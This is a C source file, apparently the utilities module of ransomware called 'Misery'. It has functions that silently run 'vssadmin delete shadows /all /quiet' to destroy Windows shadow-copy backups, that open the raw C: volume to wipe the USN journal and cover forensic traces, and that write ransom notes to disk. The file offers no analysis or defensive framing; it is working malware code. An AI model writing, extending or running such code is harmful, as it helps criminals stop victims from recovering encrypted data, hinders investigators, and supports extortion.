#include "utils.h"
#include "misery_config.h"
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

static int g_utils_last_error = 0;

bool UtilsNukeBackups(void) {
    MiseryLog(MISERY_LOG_INFO, "UtilsNukeBackups: Destroying Volume Shadow Copies");

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (CreateProcessA(NULL, "vssadmin delete shadows /all /quiet",
                       NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
        MiseryLog(MISERY_LOG_INFO, "UtilsNukeBackups: VSS destruction complete");
        return true;
    } else {
        g_utils_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "UtilsNukeBackups: Failed (err: %d)", g_utils_last_error);
        return false;
    }
}

bool UtilsWipeUSNJournal(void) {
    MiseryLog(MISERY_LOG_INFO, "UtilsWipeUSNJournal: Wiping USN Journal");

    HANDLE hVol = CreateFileA("\\\\.\\C:",
                             GENERIC_WRITE | GENERIC_READ,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);

    if (hVol != INVALID_HANDLE_VALUE) {
        DWORD dwBytes = 0;
        DeviceIoControl(hVol, 0x00090068, NULL, 0, NULL, 0, &dwBytes, NULL);
        CloseHandle(hVol);
        MiseryLog(MISERY_LOG_INFO, "UtilsWipeUSNJournal: Complete");
        return true;
    } else {
        g_utils_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "UtilsWipeUSNJournal: Failed to open volume (err: %d)", g_utils_last_error);
        return false;
    }
}


bool UtilsDropRansomNote(const char *filePath, const char *noteContent) {
    if (!filePath || !noteContent) return false;

    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, FILE_SHARE_READ,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        g_utils_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "UtilsDropRansomNote: Failed to create [%s] (err: %d)",
            filePath, g_utils_last_error);
        return false;
    }

    DWORD written = 0;
    if (WriteFile(hFile, noteContent, strlen(noteContent), &written, NULL)) {
        MiseryLog(MISERY_LOG_INFO, "UtilsDropRansomNote: Note written to [%s]", filePath);
        CloseHandle(hFile);
        return true;
    } else {
        g_utils_last_error = GetLastError();
        CloseHandle(hFile);
        return false;
    }
}
